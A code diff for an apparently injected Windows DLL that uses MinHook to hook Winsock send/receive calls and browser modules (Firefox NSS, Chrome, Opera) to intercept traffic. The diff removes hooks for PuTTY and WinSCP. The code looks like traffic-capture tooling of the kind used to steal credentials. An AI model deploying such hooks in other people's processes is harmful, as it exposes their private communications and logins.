@@ -16,7 +16,7 @@
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */
 
-#define SOCKET_ERROR            (-1)
+#include "stdafx.h"
 #include <ws2tcpip.h>
 #include "MinHook.h"
 
@@ -81,8 +81,10 @@ INT APIENTRY DllMain( HMODULE hDLL, DWORD dwReason, LPVOID Reserved) {
 			// Hooks specific to loaded DLLs
 
 			vector<MODULEENTRY32> vDlls = Process::GetProcessModules(0);
+
 			for (size_t i = 0; i < vDlls.size(); i++)
 			{
+                // Utils::errorLog((char *)Utils::ToLower(vDlls[i].szModule).c_str());
 				if (Utils::ToLower(vDlls[i].szModule).compare("wsock32.dll") == 0)
 				{
 					// Winsock 1.1
@@ -91,18 +93,18 @@ INT APIENTRY DllMain( HMODULE hDLL, DWORD dwReason, LPVOID Reserved) {
 					MH_CreateHookApi(L"wsock32.dll", "recv", MyRecv, (LPVOID*)& pRecv);
 					MH_CreateHookApi(L"wsock32.dll", "recvfrom", MyRecvFrom, (LPVOID*)& pRecvFrom);
 				}
-				else if (Utils::ToLower(vDlls[i].szModule).compare("Ws2_32.dll") == 0)
+				else if (Utils::ToLower(vDlls[i].szModule).compare("ws2_32.dll") == 0)
 				{
 					// Winsock 2.0
-					MH_CreateHookApi(L"Ws2_32.dll", "send", MyWS2Send, (LPVOID*)& pWS2Send);
-					MH_CreateHookApi(L"Ws2_32.dll", "sendto", MyWS2SendTo, (LPVOID*)& pWS2SendTo);
-					MH_CreateHookApi(L"Ws2_32.dll", "recv", MyWS2Recv, (LPVOID*)& pWS2Recv);
-					MH_CreateHookApi(L"Ws2_32.dll", "recvfrom", MyWS2RecvFrom, (LPVOID*)& pRecvFrom);
+					MH_CreateHookApi(L"ws2_32.dll", "send", MyWS2Send, (LPVOID*)& pWS2Send);
+					MH_CreateHookApi(L"ws2_32.dll", "sendto", MyWS2SendTo, (LPVOID*)& pWS2SendTo);
+					MH_CreateHookApi(L"ws2_32.dll", "recv", MyWS2Recv, (LPVOID*)& pWS2Recv);
+					MH_CreateHookApi(L"ws2_32.dll", "recvfrom", MyWS2RecvFrom, (LPVOID*)& pRecvFrom);
 					// Winsock WSA
-					MH_CreateHookApi(L"Ws2_32.dll", "WSASend", MyWSASend, (LPVOID*)& pWSASend);
-					MH_CreateHookApi(L"Ws2_32.dll", "WSASendTo", MyWSASendTo, (LPVOID*)& pWSASendTo);
-					MH_CreateHookApi(L"Ws2_32.dll", "WSARecv", MyWSARecv, (LPVOID*)& pWSARecv);
-					MH_CreateHookApi(L"Ws2_32.dll", "WSARecvFrom", MyWSARecvFrom, (LPVOID*)& pWSARecvFrom);
+					MH_CreateHookApi(L"ws2_32.dll", "WSASend", MyWSASend, (LPVOID*)& pWSASend);
+					MH_CreateHookApi(L"ws2_32.dll", "WSASendTo", MyWSASendTo, (LPVOID*)& pWSASendTo);
+					MH_CreateHookApi(L"ws2_32.dll", "WSARecv", MyWSARecv, (LPVOID*)& pWSARecv);
+					MH_CreateHookApi(L"ws2_32.dll", "WSARecvFrom", MyWSARecvFrom, (LPVOID*)& pWSARecvFrom);
 				}
 				else if (Utils::ToLower(vDlls[i].szModule).compare("nss3.dll") == 0 || Utils::ToLower(vDlls[i].szModule).compare("nspr4.dll") == 0)
 				{
@@ -141,16 +143,6 @@ INT APIENTRY DllMain( HMODULE hDLL, DWORD dwReason, LPVOID Reserved) {
 				{
 					// Hook Chrome functions
 					HookChrome("opera_browser.dll");
-				}
-				else if (Utils::ToLower(vDlls[i].szModule).substr(0, 5).compare("putty") == 0)
-				{
-					// Hook Chrome functions
-					HookPutty();
-				}
-				else if (Utils::ToLower(vDlls[i].szModule).compare("winscp.exe") == 0)
-				{
-					// Hook Chrome functions
-					HookWinSCP();
 				}
 			}
 
